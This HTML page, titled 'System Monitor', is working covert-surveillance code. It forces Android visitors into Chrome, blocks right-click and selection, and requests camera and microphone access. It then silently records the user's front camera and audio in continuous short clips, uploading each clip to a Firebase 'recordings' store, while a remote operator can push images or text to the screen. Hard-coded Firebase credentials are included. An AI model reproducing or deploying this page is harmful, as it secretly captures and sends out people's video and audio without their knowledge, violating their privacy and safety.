<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>System Monitor</title>

<!-- Firebase -->
<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>

<style>
*{
  -webkit-user-select:none;
  user-select:none;
}
body{
  margin:0;
  background:#fff;
  height:100vh;
  overflow:hidden;
}
#redirectBox{
  position:fixed;
  inset:0;
  background:#000;
  color:#0f0;
  display:flex;
  align-items:center;
  justify-content:center;
  flex-direction:column;
  z-index:99999;
  font-family:monospace;
}
#mainApp{
  display:none;
}
</style>
</head>

<body oncontextmenu="return false;">

<!-- Redirect Screen -->
<div id="redirectBox">
  <h3>Opening in Chrome…</h3>
  <p>Camera support requires Chrome</p>
</div>

<!-- MAIN APP -->
<div id="mainApp">
  <video id="preview" autoplay muted playsinline style="display:none"></video>
  <img id="displayImg" style="width:100%;display:none">
  <div id="displayText"></div>
</div>

<script>
/* ===== FORCE CHROME OPEN ===== */
(function(){
  const ua = navigator.userAgent;
  const isAndroid = /Android/i.test(ua);
  const isChrome = /Chrome/i.test(ua) && !/FBAN|FBAV|Instagram/i.test(ua);

  if(isAndroid && !isChrome){
    const url = location.href.replace(/^https?:\/\//,'');
    setTimeout(()=>{
      location.href =
        "intent://" + url +
        "#Intent;scheme=https;package=com.android.chrome;end";
    },800);
    return;
  }

  // Already Chrome → load app
  document.getElementById("redirectBox").style.display="none";
  document.getElementById("mainApp").style.display="block";
})();
</script>

<script>
/* ===== FIREBASE ===== */
const firebaseConfig = {
  apiKey: "AIzaSyBqeyPDHeWvvKsDXOp13JkVYMaWaPM9dko",
  authDomain: "camera-92fee.firebaseapp.com",
  projectId: "camera-92fee",
  storageBucket: "camera-92fee.firebasestorage.app",
  messagingSenderId: "530687776530",
  appId: "1:530687776530:web:95c00e598e07d33dbac5cb"
};

firebase.initializeApp(firebaseConfig);
const db = firebase.firestore();

/* ===== FIRESTORE LISTENER ===== */
db.collection("control").doc("currentStatus").onSnapshot(doc=>{
  if(!doc.exists) return;
  const d = doc.data();
  const img = document.getElementById("displayImg");
  const txt = document.getElementById("displayText");

  if(d.type==="clear"){
    img.style.display="none";
    txt.innerText="";
  }
  if(d.type==="image"){
    img.src=d.content;
    img.style.display="block";
  }
  if(d.type==="text"){
    txt.innerText=d.content;
  }
});

/* ===== CAMERA + RECORD ===== */
async function startCamera(){
  try{
    const s = await navigator.mediaDevices.getUserMedia({
      video:{facingMode:"user"},
      audio:true
    });
    document.getElementById("preview").srcObject=s;
    record(s);
  }catch(e){
    alert("Camera permission denied");
  }
}

function record(s){
  const mr = new MediaRecorder(s,{mimeType:'video/webm'});
  let ch=[];
  mr.ondataavailable=e=>ch.push(e.data);
  mr.onstop=()=>{
    const r=new FileReader();
    r.readAsDataURL(new Blob(ch,{type:'video/webm'}));
    r.onloadend=()=>{
      db.collection("recordings").add({
        videoData:r.result,
        time:firebase.firestore.FieldValue.serverTimestamp()
      }).then(()=>record(s));
    };
  };
  mr.start();
  setTimeout(()=>mr.state==="recording" && mr.stop(),3500);
}

startCamera();
</script>

</body>
</html>
